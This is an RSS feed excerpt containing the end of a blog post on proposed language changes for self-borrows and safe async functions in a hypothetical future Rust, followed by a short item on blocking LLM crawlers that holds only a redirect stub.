<span>// new has type MyStrings{x,y}, which is the same as a fully initialized MyStrings</span>
</code></pre></div>

<h2 id="safe-transmute">Safe transmute</h2>

<p>However, there‚Äôs still one problem - in-place transmutes between different <em>base</em> types.</p>

<p>Recall that our future state machine enum looks something like this:</p>

<div><pre><code><span>enum</span> <span>MyFuture</span> <span>{</span>
    <span>Initial</span><span>(</span><span>State0</span><span>),</span>
    <span>Await1</span><span>(</span><span>State1</span><span>),</span>
    <span>Await2</span><span>(</span><span>State2</span><span>),</span>
    <span>Final</span><span>,</span>
<span>}</span>
</code></pre></div>

<p>Our previous examples with drop and initialization changed the <em>actual</em> type (i.e. with different fields initialized or not), but the <em>base</em> type (which controls memory layout and method resolution) was the same. However, here, each enum variant has a <em>different</em> base type.</p>

<p>Currently in Rust, you always have to move values when converting between different base types. E.g. even just wrapping a value in a newtype (or unwrapping it) requires moving the value. However, the ‚Äúmove and reconstruct‚Äù paradigm won‚Äôt work here because our enum variants may contain <em>non-movable</em> types. Therefore, we need a way to convert between the different state types <em>in-place</em>.</p>

<p>Therefore, we need to add three things to Rust:</p>

<ul>
  <li>A way to specify that different types have the same memory layout</li>
  <li>A way to specify that certain fields have the same location within the type for different types</li>
  <li>The type system understands this and allows safe transmutes between them.</li>
  <li>Allow updating enums in a way that is aware of this.</li>
</ul>

<h3 id="example">Example</h3>

<p>Suppose we have an async function like this:</p>

<div><pre><code><span>async</span> <span>fn</span> <span>foo</span><span>(</span><span>mut</span> <span>s</span><span>:</span> <span>String</span><span>)</span> <span>{</span>
    <span>let</span> <span>r</span> <span>=</span> <span>&amp;</span><span>mut</span> <span>s</span><span>;</span>
    <span>sub</span><span>()</span><span>.await</span><span>;</span>
    
    <span>let</span> <span>z</span> <span>=</span> <span>if</span> <span>true</span> <span>{</span><span>r</span><span>.as_bytes</span><span>()}</span> <span>else</span> <span>{</span><span>"hello"</span><span>.as_bytes</span><span>()};</span>
    <span>sub</span><span>()</span><span>.await</span><span>;</span>
    
    <span>println!</span><span>(</span><span>"{:?}"</span><span>,</span> <span>z</span><span>);</span>
    <span>sub</span><span>()</span><span>.await</span><span>;</span>
    
    <span>println!</span><span>(</span><span>"{}"</span><span>,</span> <span>s</span><span>)</span>
<span>}</span>
</code></pre></div>

<p>The corresponding future enum states are as follows, where <code>SubFut</code> is the name of the anonymous future type returned by the <code>sub()</code> function.</p>

<div><pre><code><span>struct</span> <span>State0</span> <span>{</span><span>s</span><span>:</span> <span>String</span><span>}</span>
<span>struct</span> <span>State1</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>{</span><span>s</span><span>:</span> <span>!</span><span>'a</span> <span>mut</span> <span>String</span><span>,</span> <span>r</span><span>:</span> <span>&amp;</span><span>'a</span> <span>mut</span> <span>String</span><span>}</span>
<span>struct</span> <span>State2</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>{</span><span>s</span><span>:</span> <span>!</span><span>'a</span> <span>mut</span> <span>String</span><span>,</span> <span>z</span><span>:</span> <span>&amp;</span><span>'a</span> <span>[</span><span>u8</span><span>]}</span>
<span>struct</span> <span>State3</span> <span>{</span><span>s</span><span>:</span> <span>String</span><span>}</span>

<span>enum</span> <span>MyFuture</span> <span>{</span>
    <span>Initial</span><span>(</span><span>State0</span><span>),</span>
    <span>Await1</span><span>(</span><span>bind</span> <span>'a</span> <span>in</span> <span>State1</span><span>&lt;</span><span>'a</span><span>&gt;</span><span>,</span> <span>SubFut</span><span>),</span>
    <span>Await2</span><span>(</span><span>bind</span> <span>'a</span> <span>in</span> <span>State2</span><span>&lt;</span><span>'a</span><span>&gt;</span><span>,</span> <span>SubFut</span><span>),</span>
    <span>Await3</span><span>(</span><span>State3</span><span>,</span> <span>SubFut</span><span>),</span>
    <span>Final</span><span>,</span>
<span>}</span>
</code></pre></div>

<p>The problem comes when we need to implement the state transitions (within the <code>poll</code> method). Since <code>State1</code> and <code>State2</code> contain a non-movable field (<code>s</code>), they have to be converted <em>in-place</em>.</p>

<p>I‚Äôm not sure what the best way to do this is, but I‚Äôm assuming we have some sort of annotation which allows us to mark that these types all use the same memory layout, and that <code>s</code> is located in the same place in each type, allowing us to safely transmute between them.</p>

<p>The basic transition process for say, state 1 to state 2, is to start with an owned reference to <code>State1</code>. Then we remove the <code>r</code> field and use it to compute <code>z</code>, as per the code between the two await points. This leaves the pointer with type <code>State1{s}</code>. Then we can safely transmute this to <code>State2{s}</code>, since <code>s</code> is guaranteed to be in the same place in both types. Finally, we add the <code>z</code> field back, to get a full <code>State2</code>.</p>

<h2 id="safe-enum-updates">Safe enum updates</h2>

<p>There‚Äôs still the question of how the compiler knows that enums are being updated in a safe manner.</p>

<h3 id="mut-to-own">&amp;mut to &amp;own</h3>

<p>The first question is how to temporarily violate the type invariants during the update. <code>poll</code> takes a <em>mutable</em> reference to <code>self</code>, but in Rust, <code>&amp;mut T</code> is required to preserve the type invariants of <code>T</code> at all times (well, there are some minor exceptions, but those are built into the compiler, not something users have direct access to).</p>

<p>You‚Äôre not allowed to move out of a mutable reference, because if this were allowed, and an exception were thrown and then caught, someone could access the reference again even though the pointee is now invalid. Therefore, we need to somehow get an owned reference to the enum variant instead.</p>

<p>However, there‚Äôs one workaround. You can‚Äôt temporarily move out of a <code>&amp;mut T</code> because that would violate the invariant of <code>T</code>, but you <em>can</em> move out of a <code>&amp;mut Option&lt;T&gt;</code>. Basically, we‚Äôve widened the type invariant of the pointee to now include an ‚Äúinvalid‚Äù state. That state will never be seen in normal operation (assuming we always put the value back when done with it), but would be seen if an exception is thrown while the value is removed, and then that exception is caught and the reference accessed again.</p>

<p>For normal code, wrapping everything in an <code>Option</code> means adding a runtime cost and runtime type checks, which is why I ruled it out in previous discussions (e.g. restricting the discussion to ‚Äúsafe, <em>zero-cost</em> Rust‚Äù). However, it turns out that the <code>Future</code> api <em>already</em> effectively forces everything to have an extra ‚Äúinvalid‚Äù state anyway, so there‚Äôs no additional cost to having one. This is the reason for the extra <code>Final</code> state in all the enums shown above.</p>

<p>Therefore, when updating the enum state during <code>poll</code>, we start by setting the tag to <code>Final</code>, which lets us get ownership over the current contents of the enum. Under normal operation, we would then set it back to a valid state, but if an exception is thrown in the middle and then caught and the future is re-polled, the future would just be in the <code>Final</code> state (which will panic when polled, like a future typically will when polled after completion).</p>

<h3 id="tracking-self-ness">Tracking self-ness</h3>

<p>The basic process is to start by setting the enum tag to <code>Final</code>, which gives an <em>owned</em> reference to the former contents of the enum variant, much like how you can take an owned value out of a <code>&amp;mut Option&lt;T&gt;</code> (except that taking an owned <em>reference</em> is not something that currently exists in Rust).</p>

<p>Then we perform various mutations through the owned reference, which changes its type from <code>&amp;own State1</code> to <code>&amp;own State2</code> or whatever. Finally, once the variant pointer is updated to the correct type, we can set the tag of the original enum to match, thus restoring the invariant.</p>

<p>However, the last part is trickier than it sounds. The problem is that even if we have a <code>&amp;mut MyFuture</code> (with the variant part currently borrowed) and a <code>&amp;own State2</code> or whatever, the compiler can‚Äôt know that it is safe to set the tag back to <code>Await2</code> <em>because it doesn‚Äôt know that the <code>&amp;own State2</code> actually points to the enum you‚Äôre trying to update</em>.</p>

<p>Therefore, we need to add a function-local analysis pass to the compiler to facilitate this. When you borrow the variant of an enum, the compiler will keep track of the relation between the two local variables as long as they stay in the function, and allow a safe update of the enum if the variant pointer has the corresponding type.</p>

<h3 id="another-inconceivable-type">Another inconceivable type?</h3>

<p>Now you might be wondering, isn‚Äôt that enum-alias analysis pass yet another shadow type checker? Does this mean we have <em>another</em> inconceivable type to add to the type system?</p>

<p>It <em>is</em> a shadow type checker, but fortunately we don‚Äôt have to add it to the type system. The reason is that in order to support safe async functions, we need to be able to name the type of any local variable <em>that is held across an await point</em>. Therefore, we only need to add inconceivable types to the type system <em>if it is possible for them to exist across an await</em>.</p>

<p>As shown earlier, partially moved types and borrowed types can both exist across an await, which is why we have to add them to the type system. However, if we‚Äôre adding a <em>new</em> shadow type checker, we can just arbitrarily declare that the analysis stops at awaits, which avoids the need to add any new types to the formal type system.</p>

<p>Fortunately, the only thing we actually <em>need</em> the enum-alias pass for is to support safe enum updates within the <code>Future::poll</code> method, and <code>poll</code> is a non-async method, which means it can never contain awaits anyway. Therefore, there‚Äôs no problem with restricting our new safe enum update feature to not span awaits.</p>

<h3 id="leak">Leak</h3>

<p>This sort of ad-hoc special analysis is certainly not elegant. In an ideal world, Rust would not have to have any inconceivable types at all, not even ones that don‚Äôt cross awaits. And it certainly would be <em>possible</em> to turn this into a general purpose feature that is a first-class part of the type system.</p>

<p>However, doing this the proper way would require the introduction of <em>non-forgettable types</em>. Some people have already been asking for non-forgettable types to be added to Rust anyway for unrelated reasons (via a ‚Äú<code>Leak</code>‚Äù auto-trait), but the results would not be pretty.</p>

<p>This post is already very long, and non-forgettable types would add much <em>more</em> complexity than anything I‚Äôve covered, since it violates a more central assumption of the language than even non-movable types do. Therefore, for the sake of keeping this proposal <em>merely</em> very long and minimizing the complexity of Rust as much as possible, I think it‚Äôs best to just punt on that subject and implement enum alias checking via special compiler magic rather than non-forgettable types.</p>

<p>The ‚Äúspecial compiler magic‚Äù approach has the downside that it will be impossible to factor parts of the <code>poll</code> method out into separate helper functions, because the required types won‚Äôt exist in the type system and hence can‚Äôt be named in the function signature, but I think that‚Äôs a small price to pay for leaving this can of worms unopened.</p>

<h2 id="pin-and-move">Pin and Move</h2>

<p>With that out of the way, there‚Äôs one last topic to address, <code>Pin</code>.</p>

<p>You may have noticed a conspicuous lack of <code>Pin</code> in all my examples. That‚Äôs because <code>Pin</code> was just a hack added due to the inability to introduce a <code>Move</code> auto-trait in a fully backwards compatible manner. But since the changes I‚Äôm proposing require breaking strict backwards compatibility <em>anyway</em> (good luck fixing the type signature of <code>Drop</code> in a backwards compatible manner!), we might as well assume that <code>Pin</code> gets replaced by a <code>Move</code> auto-trait for moveable types while we‚Äôre at it.</p>

<p>However, we still need a way to replicate the functions <code>Pin</code> is currently serving, as it doesn‚Äôt work quite the same way that <code>Move</code> would.</p>

<h3 id="enum-refinements">Enum refinements</h3>

<p>In current Rust, when a <code>Future</code> is initially created, you can freely move it around. However, you have to pin it before you can <em>poll</em> it, and once polled, it becomes unmovable.</p>

<p>In a <code>Move</code> world, this is basically saying that the <code>Initial</code> state of every future enum state machine has to be <code>Move</code>, but the other states of the enum may be non-<code>Move</code>. Since <code>poll</code> takes the enum by <code>&amp;mut</code>, it can switch between the states and thus the future has to be assumed to be non-movable after polling.</p>

<p>However, Rust‚Äôs current design doesn‚Äôt support any way to reason like that. Rust‚Äôs current type system is designed around the assumption that every value has exactly one type and that type never changes, which means that there is no way to talk about properties that hold now but not in the future. If an enum type implements an auto-trait, that means that <em>every</em> variant of the enum satisfies that trait, not just one variant.</p>

<p>This isn‚Äôt just a problem for futures. It often comes up in current Rust with <code>Copy</code> too, as in ‚Äúwhy can‚Äôt I copy <code>None</code>‚Äù? For example, the following code will not compile because the array initial value has to be <code>Copy</code>, but <code>Option&lt;SomeNotCopyType</code> is not <code>Copy</code> due to the unused <code>Some</code> variant.</p>

<div><pre><code><span>struct</span> <span>SomeNotCopyType</span><span>;</span>

<span>let</span> <span>foo</span><span>:</span> <span>[</span><span>Option</span><span>&lt;</span><span>SomeNotCopyType</span><span>&gt;</span><span>;</span> <span>8</span><span>]</span> <span>=</span> <span>[</span><span>None</span><span>;</span> <span>8</span><span>];</span>
</code></pre></div>

<p>Therefore, we need a way to distinguish between ‚Äúevery variant of the enum satisfies this property‚Äù and ‚Äúthe <em>current</em> variant of the enum satisfies this property‚Äù. The syntax <code>T: Future + Move</code> already means the former, so we need to come up with different syntax for the latter.</p>

<p>I‚Äôm not sure what the best syntax is, so I‚Äôll just go with <code>T: Future if Move</code>. <code>T: Future if Move</code> means ‚Äú<code>T</code> is (any) future, <em>and</em> the value is <em>currently</em> <code>Move</code>‚Äù, while <code>T: Future + Move</code> instead means ‚ÄúT is a future type where every variant is <code>Move</code>‚Äù (which would be <code>Unpin</code> in current Rust).</p>

<p>Since explicit trait implementations can only be done for the enum type as a whole, this sort of ‚Äúper-variant trait impl‚Äù only makes sense for auto-traits and lifetimes. Therefore, the right side is restricted to auto-traits and lifetime bounds. <code>T: Future if (Move + 'static)</code> would be allowed, but <code>T: Future if Clone</code> would not.</p>

<p>Additionally, the ‚Äúif‚Äù syntax can also be applied to <em>explicit</em> non-generic enum types. E.g <code>foo: MyEnum if Copy</code> means <code>foo</code> has type <code>MyEnum</code> <em>and</em> its current variant is one that is <code>Copy</code>.</p>

<h3 id="stable-deref-types">Stable deref types</h3>

<p>In general, every borrowed type will be non-moveable. However, container types such as <code>Box</code>, <code>Vec</code>, <code>String</code>, <code>Rc</code>, etc. could optionally tell the compiler that borrowing the <em>contents</em> of the container does not cause the container itself to become non-moveable. This is what makes it possible to return data along with a pointer to that data. The outer value will always be moved by Rust‚Äôs nature, but this is still safe as long as the <em>borrowed</em> data does not move.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Whew, we‚Äôre finally done! We‚Äôve finally seen how to safely implement self-borrows and safe async functions in Hypothetical Future Rust.</p>

<p>To be honest, I think there‚Äôs approximately zero chance that this gets implemented in Rust, since the nature of a language with a large ecosystem means that you can‚Äôt just break backwards compatibility, and even seemingly trivial changes in Rust have been held up forever due to concerns around stabilization or documentation or whatever.</p>

<p>However, I hope that this post still helps people to think about the nature of the problem. In particular, it‚Äôs frustrating to see people say that self-borrows are an inherent impossibility with borrow checking when that limitation is really just a consequence of idiosyncratic choices made by Rust, and if not in current Rust, it certainly could have been supported in an alternate history Rust that made slightly different choices, and likely will be supported in future languages with borrow checking.</p>

<p>Anyway, if you have any comments or suggestions, please let me know by commenting on Reddit.</p>


  </div>

  
</article>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Blocking LLM crawlers without JavaScript (186 pts)]]></title>
            <link>https://www.owl.is/blogg/blocking-crawlers-without-javascript/</link>
            <guid>45941441</guid>
            <pubDate>Sat, 15 Nov 2025 23:30:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.owl.is/blogg/blocking-crawlers-without-javascript/">https://www.owl.is/blogg/blocking-crawlers-without-javascript/</a>, See on <a href="https://news.ycombinator.com/item?id=45941441">Hacker News</a></p>
<div id="readability-page-1" class="page"><main>
	
	<p>V√§nta i en sekund‚Ä¶</p>
	
	<meta http-equiv="refresh" content="0; url=https://www.owl.is/validate/?back=https://www.owl.is/blogg/blocking-crawlers-without-javascript/">
	</main></div>]]></description>
        </item>
    </channel>
</rss>